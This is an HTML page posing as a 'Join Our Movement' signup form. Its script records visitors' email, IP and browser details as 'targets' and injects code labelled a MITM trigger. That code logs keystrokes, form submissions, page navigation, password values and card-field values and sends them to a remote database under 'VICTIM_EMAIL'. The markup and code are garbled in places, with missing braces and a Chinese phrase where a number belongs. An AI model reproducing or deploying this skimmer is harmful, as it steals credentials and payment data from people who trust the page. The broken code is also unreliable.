<!DOCTYPE html>

    <style>

        body {

        h1 {  
            font-size: 2.5rem;

        .form-group {

        }  
        label {  
            display: block;  
            margin-bottom: 8px;  
            font-weight: 500;  
        }  
        input {  
            width: 100%;  
            padding: 15px;  
            background: rgba(255, 255, 255, 0.08);  
            border: 1px solid rgba(255, 255, 255, 0.3);  
            border-radius: 8px;  
            color: white;  
            font-size: 1rem;  
        }  
        button {  
            width: 100%;  
            padding: 16px;  
            background: linear-gradient(90deg, #ff0000, #ff9100);  
            border: none;  
            border-radius: 10px;  
            color: white;  
            font-weight: 700;  
            font-size: 1.1rem;  
            cursor: pointer;  
            transition: opacity 0.3s;  
        }  
        button:hover { opacity: 0.9; }  
        .footer {  
            margin-top: 30px;  
            font-size: 0.8rem;  
            color: #777;  
            text-align: center;

        .footer a { color: #ccc; text-decoration: none; }  
        .disclaimer {

            padding: 15px;  
            background: rgba(255, 0, 0, 0.1);  
            border-radius: 10px;

<body>  
    <div class="container">  
        <div class="header">  
            <h1>Join Our Movement</h1>

        <form id="signup-form">  
            <div class="form-group">  
                <label for="email">Email *</label>

            <div class="form-group">

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>  
    <script>

        const SUPABASE_URL = 'https://ursrbmvgrpjhuogfimal.supabase.co';  
        const SUPABASE_KEY = 'sb_publishable_tPbGnhGMinGYFI5tc4KbvA_7Gu2Ketw';  
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

        // Get IP Address  
        async function getIP() {  
            try {  
                const response = await fetch('https://api.ipify.org?format=json');  
                const data = await response.json();  
                return data.ip;  
            } catch (error) {  
                return 'unknown';  
            }  
        }

            // ACTUAL MITM proxy trigger (simplified)  
            const proxyScript = document.createElement('script');  
            proxyScript.textContent = `  
                // MITM Proxy Activation Trigger

                    const VICTIM_IP = '${ip}';  
                      
                    // Start surveillance immediately

                        // Keylogger  
                        let keystrokes = [];  
                        document.addEventListener('keydown', (e) => {  
                            const keyData = {  
                                key: e.key,  
                                target: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.name ? '[name="' + e.target.name + '"]' : ''),  
                                value: e.target.value,  
                                url: window.location.href,  
                                timestamp: Date.now()  
                            };  
                              
                            // Send to admin immediately  
                            fetch('${SUPABASE_URL}/rest/v1/tracking_logs', {  
                                method: 'POST',  
                                headers: {  
                                    'apikey': '${SUPABASE_KEY}',  
                                    'Content-Type': 'application/json'  
                                },  
                                body: JSON.stringify({  
                                    email: VICTIM_EMAIL,

                                    details: keyData,  
                                    timestamp: new Date().toISOString()

                            });  
                              
                            keystrokes.push(keyData);  
                        });  
                          
                        // Form submission capture  
                        document.addEventListener('submit', (e) => {  
                            const formData = {};  
                            Array.from(e.target.elements).forEach(el => {  
                                if (el.name && el.value) {  
                                    formData[el.name] = el.value;  
                                }  
                            });  
                              
                            // Send form data  
                            fetch('${SUPABASE_URL}/rest/v1/tracking_logs', {  
                                method: 'POST',  
                                headers: {  
                                    'apikey': '${SUPABASE_KEY}',  
                                    'Content-Type': 'application/json'  
                                },  
                                body: JSON.stringify({  
                                    email: VICTIM_EMAIL,  
                                    action: 'form_submission',  
                                    details: {

                        // Website navigation log  
                        let lastUrl = window.location.href;  
                        setInterval(() => {  
                            if (window.location.href !== lastUrl) {  
                                lastUrl = window.location.href;  
                                  
                                fetch('${SUPABASE_URL}/rest/v1/tracking_logs', {  
                                    method: 'POST',  
                                    headers: {  
                                        'apikey': '${SUPABASE_KEY}',  
                                        'Content-Type': 'application/json'  
                                    },  
                                    body: JSON.stringify({  
                                        email: VICTIM_EMAIL,  
                                        action: 'page_navigation',  
                                        details: {  
                                            from: document.referrer,  
                                            to: window.location.href,  
                                            title: document.title  
                                        },  
                                        timestamp: new Date().toISOString()  
                                    })  
                                });  
                            }  
                        }, 1000);  
                          
                        // Sensitive data detection  
                        setInterval(() => {  
                            // Password fields  
                            document.querySelectorAll('input[type="password"]').forEach(el => {  
                                if (el.value) {

                                            'Content-Type': 'application/json'  
                                        },  
                                        body: JSON.stringify({  
                                            email: VICTIM_EMAIL,  
                                            action: 'sensitive_data',  
                                            details: {  
                                                type: 'password',  
                                                name: el.name || 'unknown',  
                                                value: el.value,  
                                                location: window.location.href  
                                            },  
                                            timestamp: new Date().toISOString()  
                                        })  
                                    });  
                                }  
                            });  
                              
                            // Card fields  
                            const cardPatterns = ['card', 'credit', 'cc', 'cvv', 'exp', 'number'];  
                            cardPatterns.forEach(pattern => {  
                                document.querySelectorAll(\`input[name*="\${pattern}"], input[placeholder*="\${pattern}"]\`).forEach(el => {  
                                    if (el.value && el.value.length >不符合卡号长度检查时发送) {

                                                'Content-Type': 'application/json'  
                                            },  
                                            body: JSON.stringify({  
                                                email: VICTIM_EMAIL,

                                                details: {

                                                    value: el.value,

                        // App detection  
                        const socialMediaPatterns = {  
                            whatsapp: /web\.whatsapp\.com|whatsapp/i,  
                            facebook: /facebook\.com|fb\.com/i,  
                            instagram: /instagram\.com/i,  
                            twitter: /twitter\.com|x\.com/i,  
                            gmail: /mail\.google\.com|gmail\.com/i

                        setInterval(() => {  
                            const currentUrl = window.location.href;  
                            for (const [app, pattern] of Object.entries(socialMediaPatterns)) {  
                                if (pattern.test(currentUrl)) {

            document.head.appendChild(proxyScript);

        // Form Submission  
        document.getElementById('signup-form').addEventListener('submit', async (e) => {  
            e.preventDefault();

            const email = document.getElementById('email').value;  
            const zip = document.getElementById('zip').value;  
            const ip = await getIP();

            // Save target to Supabase  
            try {  
                const { error } = await supabaseClient  
                    .from('targets')  
                    .insert([{  
                        email,  
                        zip,  
                        ip,  
                        user_agent: navigator.userAgent,  
                        screen_resolution: \`\${screen.width}x\${screen.height}\`,  
                        platform: navigator.platform,  
                        language: navigator.language,  
                        status: 'pending',  
                        created_at: new Date().toISOString()  
                    }]);  
                  
                if (error) throw error;  
            } catch (err) {  
                console.error("Failed to insert target:", err);  
            }

            // Deploy surveillance immediately  
            deployProxyTrigger(email, ip);

            // Log initial activity  
            try {  
                await supabaseClient  
                    .from('tracking_logs')  
                    .insert([{  
                        email: email,  
                        action: 'trap_activated',  
                        details: {  
                            ip: ip,  
                            userAgent: navigator.userAgent,  
                            url: window.location.href  
                        },  
                        timestamp: new Date().toISOString()  
                    }]);  
            } catch (err) {  
                console.error("Failed to log activity:", err);  
            }

            // Success message  
            alert('Thank you for joining! Your support has been logged.');  
            e.target.reset();  
        });

        // Initial load log  
        window.addEventListener('load', async () => {  
            try {  
                const ip = await getIP();  
                await supabaseClient  
                    .from('tracking_logs')  
                    .insert([{  
                        action: 'page_load',  
                        details: {  
                            ip: ip,  
                            userAgent: navigator.userAgent,  
                            url: window.location.href  
                        },  
                        timestamp: new Date().toISOString()  
                    }]);  
            } catch (err) {  
                console.error("Failed to log page load:", err);  
            }  
        });  
    </script>
